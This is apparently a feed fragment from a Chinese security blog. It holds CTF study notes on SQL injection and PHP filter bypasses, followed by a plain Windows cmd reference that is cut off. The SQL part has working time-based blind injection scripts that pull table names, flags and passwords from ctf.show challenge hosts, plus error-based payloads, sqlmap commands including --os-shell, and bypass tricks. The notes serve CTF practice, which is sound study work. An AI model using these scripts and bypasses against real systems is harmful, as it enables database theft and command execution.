title="从字段中找到想要的数据"></a>从字段中找到想要的数据</h3><p><strong>select if(substr((select group_concat(你想看的字段1,你想看的字段2) from 你想看的表名表名),需要找的下标,1)&#x3D;’想要找的字符’,sleep(3),1);</strong></p><h2 id="例子脚本"><a href="#例子脚本" class="headerlink" title="例子脚本"></a>例子脚本</h2><p><strong>重点:为什么要使用timeout，timeout是最大延迟时间，是客户端到服务器到客户端的，如果和延时注入的时间相同，那么延时了，是一定比timeout是一定不够的，所以会执行except</strong><br>import requests</p><p>url &#x3D; “<a href="http://1ffa162f-51a1-4516-9904-03b03f4d641e.challenge.ctf.show/index.php?action=check&username=">http://1ffa162f-51a1-4516-9904-03b03f4d641e.challenge.ctf.show/index.php?action=check&amp;username=</a>“<br>payload &#x3D; “”<br>end &#x3D; “&amp;password&#x3D;1”<br>string &#x3D; “}abcdefghljkimnopqrstuvwxyz0123456789,_-@{“</p><p>def get_tablename():</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ret = &#x27;&#x27;</span><br><span class="line">for x in range(1, 10):</span><br><span class="line">    for y in string:</span><br><span class="line">        payload = &quot;&#x27;) union select if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(3),1)  --+&quot;.format(</span><br><span class="line">            x, y)</span><br><span class="line">        try:</span><br><span class="line">            req = requests.get(url + payload + end, timeout=3)</span><br><span class="line">        except:</span><br><span class="line">            ret += y</span><br><span class="line">            print(ret)</span><br></pre></td></tr></table></figure><p>def get_columns():</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ret = &#x27;&#x27;</span><br><span class="line">for x in range(1, 20):</span><br><span class="line">    for y in string:</span><br><span class="line">        payload = &quot;&#x27;) union select if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(2),1) --+&quot;.format(</span><br><span class="line">            x, y)</span><br><span class="line">        try:</span><br><span class="line">            #print(url + payload + end)</span><br><span class="line">            req = requests.get(url + payload + end, timeout=2)</span><br><span class="line">        except:</span><br><span class="line">            ret += y</span><br><span class="line">            print(ret)</span><br></pre></td></tr></table></figure><p>def get_dump():</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ret = &#x27;&#x27;</span><br><span class="line">for x in range(1, 50):</span><br><span class="line">    for y in string:</span><br><span class="line">        payload = &quot;&#x27;) union select if(substr((select group_concat(flag) from flag),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(2),1) --+&quot;.format(</span><br><span class="line">            x, y)</span><br><span class="line">        try:</span><br><span class="line">            # print(url + payload + end)</span><br><span class="line">            req = requests.get(url + payload + end, timeout=2)</span><br><span class="line">        except:</span><br><span class="line">            ret += y</span><br><span class="line">            print(ret)</span><br></pre></td></tr></table></figure><p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 获取表名</span><br><span class="line">#get_tablename()</span><br><span class="line"># 获取字段名</span><br><span class="line">#get_columns()</span><br><span class="line">#获取字段的列数据</span><br><span class="line">get_dump()</span><br></pre></td></tr></table></figure><hr><h1 id="自己写的脚本"><a href="#自己写的脚本" class="headerlink" title="自己写的脚本"></a>自己写的脚本</h1><p>import requests</p><p>url &#x3D; “<a href="http://7f378bf4-ff73-43ee-98c8-781a38f926f1.challenge.ctf.show/api/v4.php?id=">http://7f378bf4-ff73-43ee-98c8-781a38f926f1.challenge.ctf.show/api/v4.php?id=</a>“</p><p>string &#x3D; “}abcdefghijklmnopqrstuvwxyz,_0123456789-{“<br>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1, 48):</span><br><span class="line">    for j in string:</span><br><span class="line">        # 获取当前所用的数据库数据库</span><br><span class="line">        # end = &quot; &#x27; union select &#x27;q&#x27;,if(substr((select database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),1); --+&quot;.format(i, j)</span><br><span class="line">        # 获取所有的数据库数据库</span><br><span class="line">        # end = &quot; &#x27; union select &#x27;q&#x27;,if(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),1); --+&quot;.format(i, j)</span><br><span class="line"> </span><br><span class="line">        # ------------------------------------------------------------------------------#</span><br><span class="line"> </span><br><span class="line">        # 获取指定数据库的所有表</span><br><span class="line">        # end = &quot; &#x27; union select &#x27;q&#x27;,if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),1) --+&quot;.format(i, j)</span><br><span class="line"> </span><br><span class="line">        # ------------------------------------------------------------------------------#</span><br><span class="line"> </span><br><span class="line">        # 获取指定表中的字段名</span><br><span class="line">        # end = &quot; &#x27; union select &#x27;q&#x27;,if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user4&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),1) --+ &quot;.format(i, j)</span><br><span class="line"> </span><br><span class="line">        # ------------------------------------------------------------------------------#</span><br><span class="line"> </span><br><span class="line">        #获取指定数据库中的表中的所有字段下的数据</span><br><span class="line"> </span><br><span class="line">        end = &quot;&#x27; union select &#x27;q&#x27;,if(substr((select group_concat(password) from ctfshow_web.ctfshow_user4),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(5),1) --+ &quot;.format(i, j)</span><br><span class="line"> </span><br><span class="line">        try:</span><br><span class="line">            req = requests.get(url + end, timeout=5)</span><br><span class="line">        except:</span><br><span class="line">            result += j</span><br><span class="line">            print(f&#x27;[+] &#123;result&#125;&#x27;)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h1 id="报错注入专题"><a href="#报错注入专题" class="headerlink" title="报错注入专题"></a>报错注入专题</h1><h2 id="两种报错注入，extractvalue-和-updatexml"><a href="#两种报错注入，extractvalue-和-updatexml" class="headerlink" title="两种报错注入，extractvalue 和 updatexml"></a>两种报错注入，extractvalue 和 updatexml</h2><p><strong>select extractvalue(1,concat(0x7e,( 填入想执行的sql语句 ),0x7e))</strong><br><strong>select updatexml(1,concat(0x7e,( 填入想执行的sql语句 ),0x7e),1)</strong><br><strong>执行的sql语句参照本文开头记录的语句</strong></p><h1 id="Sqlmap使用"><a href="#Sqlmap使用" class="headerlink" title="Sqlmap使用"></a>Sqlmap使用</h1><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><p>列出当前数据库</p><p>cookie注入命令：sqlmap.py -u 注入点 –dbs</p><p>指定数据库猜表</p><p>Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 –tables</p><p>猜字段</p><p>Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 -T 表名 –columns</p><p>猜字段内容</p><p>Cookie注入命令：sqlmap.py -u 注入点 -D 数据库 -T 表名 -C “想破解的字段” –dump</p><h2 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h2><p><a href="https://sirbei.com/wp-content/uploads/2022/05/4229118920.pdf">SQLMAP_使用文档(中文) .pdf</a></p><ul><li><strong>–os-shell 获取os交互式shell –sql-shell 获取sql交互式shell</strong></li><li><strong>–dbms&#x3D;mysql 指定sql的数据库</strong></li><li><strong>–forms 提交表单测试</strong></li><li><strong>–batch 默认选项进行</strong></li><li><strong>sqlmap xxx –dbs 列出所有数据库</strong></li><li><strong>sqlmap xxx –D [数据库] –tables 列出该数据库的表名</strong></li><li><strong>sqlmap xx -D [数据库] –T [表名] –columns 列出素有字段</strong></li><li><strong>sqlmap xx -D [数据库] –T [表名] -C [字段] –dump 列出字段的所有内容</strong></li><li><strong>–user-agent&#x3D;xxx 指定UA –referer&#x3D;xxx 伪装referer</strong></li><li><strong>–data “id&#x3D;1” 传参注入</strong></li><li><strong>–method&#x3D;”PUT” 传参方式改变</strong></li><li><strong>–cookie&#x3D;”xxx” 更改cookie</strong></li><li><strong>–safe-url&#x3D;xxx 设置在测试目标地址前访问的安全链接 –safe-freq&#x3D;次数 设置两次注入测试前访问安全链接的次数</strong></li><li><strong>–prefix&#x3D;PREFIX 攻击载荷的前缀 –suffix&#x3D;SUFFIX 攻击载荷的后缀</strong></li><li><strong>–tamper&#x3D;[内置脚本] 选择内置脚本</strong></li></ul><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>select username,password from user where username !&#x3D;’flag’ and id &#x3D; ‘“.$_GET[‘id’].”‘ limit 1;<br><strong>答案 传入999’ or id &#x3D;’26</strong></p><h2 id="去掉空格成功执行的实例"><a href="#去掉空格成功执行的实例" class="headerlink" title="去掉空格成功执行的实例"></a>去掉空格成功执行的实例</h2><p>select id,username,password from user where id&#x3D;’111’union select’1’,(select<code>password</code>from<code>user</code>where<code>id</code>&#x3D;’2’),3;</p><h2 id="使用like绕过的实例"><a href="#使用like绕过的实例" class="headerlink" title="使用like绕过的实例"></a>使用like绕过的实例</h2><p>select id,username,password from user where username like ‘%fla%’;</p><h2 id="使用group-by-xx筛选出列名出现次数-并且使用regexp匹配有没有关键词"><a href="#使用group-by-xx筛选出列名出现次数-并且使用regexp匹配有没有关键词" class="headerlink" title="使用group by xx筛选出列名出现次数 并且使用regexp匹配有没有关键词"></a>使用group by xx筛选出列名出现次数 并且使用regexp匹配有没有关键词</h2><p>select count(*) from user group by pass having pass regexp(0x xxxx);</p><ul><li><strong>先将pass出现的个数有几种回显出来，然后使用regexp来匹配</strong></li></ul><h2 id="如果一个数据使用了md5-POST-‘password’-true"><a href="#如果一个数据使用了md5-POST-‘password’-true" class="headerlink" title="如果一个数据使用了md5($_POST[‘password’],true);"></a>如果一个数据使用了md5($_POST[‘password’],true);</h2><p>&#x2F;&#x2F;拼接sql语句查找指定ID用户<br>$sql &#x3D; “select count(*) from ctfshow_user where username &#x3D; ‘$username’ and password&#x3D; ‘$password’”;<br>$username &#x3D; $_POST[‘username’];<br>$password &#x3D; md5($_POST[‘password’],true);</p><ul><li><strong>当password传入ffifdyop,md5(“ffifdyop”,true)，返回的二进制存在’or’6，存在sql注入</strong></li></ul><h2 id="sql语句，where后面的语句如果不使用单引号"><a href="#sql语句，where后面的语句如果不使用单引号" class="headerlink" title="sql语句，where后面的语句如果不使用单引号"></a>sql语句，where后面的语句如果不使用单引号</h2><p>select pass from ctfshow_user where username &#x3D; 0;</p><ul><li><strong>本句的username如果不用””，那么查询的时候会将所有数据回显</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF知识集-PHP特性</title>
      <link href="/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2024/12/13/CTF%E7%9F%A5%E8%AF%86%E9%9B%86-PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="写在开头可能会用到的提示"><a href="#写在开头可能会用到的提示" class="headerlink" title="写在开头可能会用到的提示"></a>写在开头可能会用到的提示</h1><ul><li><strong>call_user_func 调用的函数可以不区分大小写</strong></li><li><strong>preg_match过滤存在长度溢出，长度超过100w检测失效。str_repeat(‘show’,250000); 生成100w个字符</strong></li><li><strong>preg_match是无法处理数组的，例如:preg_match($num),$num[1]&#x3D;1,这样子无法处理</strong></li><li><strong>intval()是可以检测十进制 | 八进制 | 十六进制的。如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；如果字符串以 “0” 开始，使用 8 进制(octal)；否则，使用十进制</strong></li><li><strong>intval()。可以搭配的特殊字符是+和空格，当然也可以URL编码后提交。</strong></li><li><strong>highlight_file</strong> 包含的文件可以是全路径,可以接php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx</li><li><strong>php的md5传入的是数组，那么md5一样，例如：a[]&#x3D;1和b[]&#x3D;2的md5值一样 补充：sha1可以</strong></li><li><strong>%00 可以截断</strong></li><li><strong>echo new DirectoryIterator(getcwd()); 遍历目录类 echo new filesystemIterator(getcwd()); 遍历文件类</strong></li><li><strong>var_dump($GLOBALS); 可以查看当前的全部变量</strong></li><li><strong>is_file() 检测文件函数，可以用伪协议来绕过</strong></li><li><strong>php会自动将不符合规范的变量(空格等特殊符号)转换为_，且只会转换一次，例如fl[ag.com，转换为fl_ag.com，后面的 . 不会被转换</strong></li><li><strong>小知识点： <em>()是一个函数，</em>()&#x3D;&#x3D;gettext() 是gettext()的拓展函数</strong></li><li><strong>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法</strong></li><li><strong>file_get_contents可以使用伪协议，例如:file_get_contents($file)&#x3D;&#x3D;&#x3D;”123”，$file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,123;或者是php:&#x2F;&#x2F;input</strong></li><li><strong>curl 不仅支持http(s)，而且支持file协议，例如: curl file:&#x2F;&#x2F;&#x2F;home&#x2F;sibei&#x2F;test</strong></li><li><strong>$_POST[cmd]可以写为$_POST{cmd}</strong></li><li><strong>php无论有没有上传文件的参数，如果强制上传文件，那么PHP会先保存到临时目录,待脚本执行结束后删除。linux的临时目录文件是&#x2F;tmp&#x2F;php??????，问号代表任意字符。如果存在命令执行，那么就可以通过执行强制的临时文件来达到命令执行。linux通配符匹配 &#x2F;???&#x2F;????????[@-[]，这样可以匹配最后一位是大写字母的文件，贴个脚本</strong><br><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241212204856247.png" alt="image-20241212204856197"></li></ul><h1 id="CVE收集"><a href="#CVE收集" class="headerlink" title="CVE收集"></a>CVE收集</h1><h2 id="PHP5-5-9整数溢出漏洞"><a href="#PHP5-5-9整数溢出漏洞" class="headerlink" title="PHP5.5.9整数溢出漏洞"></a>PHP5.5.9整数溢出漏洞</h2><ul><li><strong>当数组下标为4294967296时，等同于下标0，例如：maodoo[4294967296]等同于maodoo[0]</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows常用命令大全</title>
      <link href="/2024/12/12/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"/>
      <url>/2024/12/12/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font style="color:rgb(0, 0, 0);">前言</font></h2><p><strong><font style="color:rgb(51, 51, 51);">cmd</font></strong><font style="color:rgb(51, 51, 51);">是</font><strong><font style="color:rgb(51, 51, 51);">command</font></strong><font style="color:rgb(51, 51, 51);">的缩写.即命令行 。</font></p><p><font style="color:rgb(51, 51, 51);">虽然随着计算机产业的发展，</font><strong><font style="color:rgb(0, 82, 217);">Windows</font></strong><font style="color:rgb(51, 51, 51);"> 操作系统的应用越来越广泛，</font><strong><font style="color:rgb(51, 51, 51);">DOS</font></strong><font style="color:rgb(51, 51, 51);"> 面临着被淘汰的命运，但是因为它运行安全、稳定，有的用户还在使用，所以一般Windows 的各种版本都与其兼容，用户可以在</font><strong><font style="color:rgb(51, 51, 51);">Windows</font></strong><font style="color:rgb(51, 51, 51);"> 系统下运行</font><strong><font style="color:rgb(51, 51, 51);">DOS</font></strong><font style="color:rgb(51, 51, 51);">，中文版</font><strong><font style="color:rgb(51, 51, 51);">Windows XP</font></strong><font style="color:rgb(51, 51, 51);">中的命令提示符进一步提高了与DOS下操作命令的兼容性，用户可以在命令提示符直接输入中文调用文件。</font></p><p><font style="color:rgb(51, 51, 51);">作为一个开发者，我们用的最多的就是</font><strong><font style="color:rgb(51, 51, 51);">windows</font></strong><font style="color:rgb(51, 51, 51);">，但是对于</font><strong><font style="color:rgb(51, 51, 51);">cmd</font></strong><font style="color:rgb(51, 51, 51);">，我不知道大家熟不熟，反正我是一直不怎么熟悉。平时操作</font><strong><font style="color:rgb(51, 51, 51);">linux</font></strong><font style="color:rgb(51, 51, 51);">比较多，反而忽视了</font><strong><font style="color:rgb(51, 51, 51);">cmd</font></strong><font style="color:rgb(51, 51, 51);">相关命令，这里大致总结一些常用的命令，作为记录。</font></p><h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1. 常用命令"></a><font style="color:rgb(0, 0, 0);">1. 常用命令</font></h2><h3 id="1-1-cd命令"><a href="#1-1-cd命令" class="headerlink" title="1.1 cd命令"></a><font style="color:rgb(0, 0, 0);">1.1 cd命令</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//进入d盘</span><br><span class="line">D:</span><br><span class="line">//进入F盘</span><br><span class="line">F:</span><br><span class="line">cd /?     //获取使用帮助</span><br><span class="line"></span><br><span class="line">cd \       //跳转到硬盘的根目录</span><br><span class="line"></span><br><span class="line">cd C:\WINDOWS  //跳转到当前硬盘的其他文件</span><br><span class="line"></span><br><span class="line">d:        //跳转到其他硬盘</span><br><span class="line"></span><br><span class="line">cd /d e:\software    //跳转到其他硬盘的其他文件夹，注意此处必须加/d参数。否则无法跳转。</span><br><span class="line"></span><br><span class="line">cd..      //跳转到上一层目录</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165729401.png" alt="image-20241211165729293"></p><h3 id="1-2-查看目录文件"><a href="#1-2-查看目录文件" class="headerlink" title="1.2 查看目录文件"></a><font style="color:rgb(0, 0, 0);">1.2 查看目录文件</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//查看当前目录下的文件，类似于linux下的ls</span><br><span class="line">dir</span><br><span class="line">如果是需要查看隐藏文件的或者更多操作的话，可以使用dir /?来查看其它用法，cmd这点挺好的。</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165732202.png" alt="image-20241211165731996"></p><h3 id="1-3-创建目录和删除目录"><a href="#1-3-创建目录和删除目录" class="headerlink" title="1.3 创建目录和删除目录"></a><font style="color:rgb(0, 0, 0);">1.3 创建目录和删除目录</font></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建目录</span></span><br><span class="line">md 目录名（文件夹）</span><br><span class="line"><span class="comment">//删除目录</span></span><br><span class="line">rd 目录名（文件夹）</span><br></pre></td></tr></table></figure><h3 id="1-4-查看本机ip"><a href="#1-4-查看本机ip" class="headerlink" title="1.4 查看本机ip"></a><font style="color:rgb(0, 0, 0);">1.4 查看本机ip</font></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig <span class="comment">//查看本机ip</span></span><br></pre></td></tr></table></figure><h3 id="1-5-清除屏幕"><a href="#1-5-清除屏幕" class="headerlink" title="1.5 清除屏幕"></a><font style="color:rgb(0, 0, 0);">1.5 清除屏幕</font></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cls</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">类似于linux下的clear</font></p><h3 id="1-6-文件"><a href="#1-6-文件" class="headerlink" title="1.6 文件"></a><font style="color:rgb(0, 0, 0);">1.6 文件</font></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 路径\文件名 路径\文件名 ：把一个文件拷贝到另一个地方。</span><br></pre></td></tr></table></figure><h3 id="1-7-移动文件"><a href="#1-7-移动文件" class="headerlink" title="1.7 移动文件"></a><font style="color:rgb(0, 0, 0);">1.7 移动文件</font></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move 路径\文件名 路径\文件名 ：把一个文件移动（就是剪切+）到另一个地方。</span><br></pre></td></tr></table></figure><h3 id="1-8-删除文件"><a href="#1-8-删除文件" class="headerlink" title="1.8 删除文件"></a><font style="color:rgb(0, 0, 0);">1.8 删除文件</font></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个是专门删除文件的，不能删除文件夹</span></span><br><span class="line">del 文件名</span><br></pre></td></tr></table></figure><h3 id="1-9-ping"><a href="#1-9-ping" class="headerlink" title="1.9 ping"></a><font style="color:rgb(0, 0, 0);">1.9 ping</font></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用来测试网络是否畅通</span></span><br><span class="line">ping <span class="title function_">ip</span>(主机名)</span><br></pre></td></tr></table></figure><h3 id="1-10-taskkill"><a href="#1-10-taskkill" class="headerlink" title="1.10 taskkill"></a><font style="color:rgb(0, 0, 0);">1.10 taskkill</font></h3><p><strong><font style="color:rgb(51, 51, 51);">列出所有任务及进程号，杀进程</font></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">taskkill</span><br><span class="line"></span><br><span class="line">taskkill /?  获取使用帮助</span><br></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">taskkill</font></strong><font style="color:rgb(51, 51, 51);">是用来终止进程的。具体的命令规则如下：</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">TASKKILL</span> [<span class="regexp">/S system [/U username [/P [password]]]]</span></span><br><span class="line"><span class="regexp">&#123; </span></span><br><span class="line"><span class="regexp">    [/FI filter] [/PID processid | /IM imagename] &#125; [/F] [/T]</span></span><br></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">描述:</font></strong></p><p><font style="color:rgb(51, 51, 51);">这个</font><a href="https://cloud.tencent.com/product/cli?from_column=20065&from=20065"><font style="color:rgb(51, 51, 51);">命令行工具</font></a><font style="color:rgb(51, 51, 51);">可用来结束至少一个进程。</font></p><p><font style="color:rgb(51, 51, 51);">可以根据进程 id 或映像名（Image）来结束进程。</font></p><p><strong><font style="color:rgb(51, 51, 51);">参数列表:</font></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/S system 指定要连接到的远程系统。</span><br><span class="line">/U [domain\]user 指定应该在哪个用户上下文</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">执行这个命令:</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/P [password] 为提供的用户上下文指定密码。如果忽略，提示输入。</span><br><span class="line">/F 指定要强行终止的进程。</span><br><span class="line">/<span class="variable constant_">FI</span> filter 指定筛选进或筛选出查询的的任务。</span><br><span class="line">/<span class="variable constant_">PID</span> process id 指定要终止的进程的<span class="variable constant_">PID</span>。</span><br><span class="line">/<span class="variable constant_">IM</span> image name 指定要终止的进程的映像名称。通配符 <span class="string">&#x27;*&#x27;</span>可用来指定所有映像名。</span><br><span class="line">/T <span class="title class_">Tree</span> <span class="attr">kill</span>: 终止指定的进程和任何由此启动的子进程。</span><br><span class="line">/? 显示帮助/用法。</span><br></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">例如:</font></strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">TASKKILL</span> /S system /F /<span class="variable constant_">IM</span> notepad.<span class="property">exe</span> /T</span><br><span class="line"><span class="variable constant_">TASKKILL</span> /<span class="variable constant_">PID</span> <span class="number">1230</span> /<span class="variable constant_">PID</span> <span class="number">1241</span> /<span class="variable constant_">PID</span> <span class="number">1253</span> /T</span><br><span class="line"><span class="variable constant_">TASKKILL</span> /F /<span class="variable constant_">IM</span> <span class="variable constant_">QQ</span>.<span class="property">exe</span></span><br><span class="line"><span class="variable constant_">TASKKILL</span> /F /<span class="variable constant_">IM</span> notepad.<span class="property">exe</span> /<span class="variable constant_">IM</span> mspaint.<span class="property">exe</span></span><br><span class="line"><span class="variable constant_">TASKKILL</span> /F /<span class="variable constant_">FI</span> <span class="string">&quot;PID ge 1000&quot;</span> /<span class="variable constant_">FI</span> <span class="string">&quot;WINDOWTITLE ne untitle*&quot;</span></span><br><span class="line"><span class="variable constant_">TASKKILL</span> /F /<span class="variable constant_">FI</span> <span class="string">&quot;USERNAME eq NT AUTHORITY\SYSTEM&quot;</span> /<span class="variable constant_">IM</span> notepad.<span class="property">exe</span></span><br></pre></td></tr></table></figure><h3 id="1-11-netstat-查看网络连接状态"><a href="#1-11-netstat-查看网络连接状态" class="headerlink" title="1.11 netstat 查看网络连接状态"></a><font style="color:rgb(0, 0, 0);">1.11 netstat 查看网络连接状态</font></h3><p><font style="color:rgb(51, 51, 51);">显示协议统计信息和当前 </font><strong><font style="color:rgb(0, 82, 217);">TCP</font>****<font style="color:rgb(51, 51, 51);">&#x2F;IP</font></strong><font style="color:rgb(51, 51, 51);"> 网络连接。该命令可以查看当前机器建立的所有网络链接状态，以及对应哪个进程。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -help 获取命令行使用帮助信息</span><br><span class="line"></span><br><span class="line">netstat -ano  //查看网络连接、状态以及对应的进程id</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165739707.png" alt="image-20241211165739546"></p><p><strong><font style="color:rgb(51, 51, 51);">语法：</font></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat [选项]</span><br></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">参数：</font></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 